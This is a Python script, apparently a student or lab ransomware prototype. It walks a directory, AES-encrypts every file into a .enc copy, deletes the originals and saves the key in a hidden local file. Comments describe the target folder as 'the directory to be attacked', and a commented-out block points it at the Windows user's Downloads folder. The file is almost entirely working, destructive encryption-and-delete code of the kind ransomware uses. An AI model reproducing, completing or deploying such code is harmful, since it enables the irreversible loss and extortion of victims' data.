from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
import os
import logging

# Set up logging for error handling
logging.basicConfig(filename="encryption_log.log", level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")


# generate a random 16-byte AES key 
KEY = get_random_bytes(16) 

# save the AES key locally in a hidden file
def save_key_locally(key, file_path=".secret_key"):
    with open(file_path, "w") as key_file:
        key_file.write(key.hex()) 
    print(f"Encryption key saved to {file_path}")


# Function to encrypt a file
def encrypt_file(file_path, key):
    try:
        # Open the file passed
        with open(file_path, 'rb') as file:
            # Read the file as a plaintext
            plain_text = file.read()

        # Initialize the AES cipher
        cipher = AES.new(key, AES.MODE_CFB)

        # Encrypt the file content
        cipher_text = cipher.encrypt(plain_text)

        # Write the encrypted output file
        enc_file_path = file_path + ".enc"
        with open(enc_file_path, "wb") as encrypted_file:
            # Write the IV for decryption
            encrypted_file.write(cipher.iv)

            # Write the encrypted text
            encrypted_file.write(cipher_text)

        # Log successful encryption
        logging.info(f"Encryption successful: {file_path} -> {enc_file_path}")

        # Delete the original file after encryption
        os.remove(file_path)
        logging.info(f"Original file deleted: {file_path}")

    except FileNotFoundError as e:
        logging.error(f"File not found: {file_path} - {e}")
    except PermissionError as e:
        logging.error(f"Permission error accessing the file: {file_path} - {e}")
    except Exception as e:
        logging.error(f"Error during encryption for file {file_path}: {e}")

# Function to encrypt a whole directory
def encrypt_directory(directory, key):
    try:
        # Explore the given directory
        for root, dirs, files in os.walk(directory):
            # Iterate over the files
            for file in files:
                file_path = os.path.join(root, file)
                try:
                    # Execute the encryption function on each file
                    encrypt_file(file_path, key)
                except Exception as e:
                    logging.error(f"Failed to encrypt file {file_path}: {e}")

    except FileNotFoundError as e:
        logging.error(f"Directory not found: {directory} - {e}")
    except PermissionError as e:
        logging.error(f"Permission error accessing directory: {directory} - {e}")
    except Exception as e:
        logging.error(f"Error during directory encryption: {e}")

if __name__ == "__main__":
    # pass the directory to be attacked
    encrypt_directory("test", KEY)

    # Save the encryption key locally
    save_key_locally(KEY)

    #  # Get the current user's username dynamically on Windows
    # userName = os.getlogin()

    # # Define the path to the "Downloads" directory on Windows
    # download_path = f"C:\\Users\\{userName}\\Downloads\\test"  # Adjust the folder as necessary

    # # Pass the directory to be attacked
    # encrypt_directory(download_path, KEY)

    # # Save the encryption key locally
    # save_key_locally(KEY)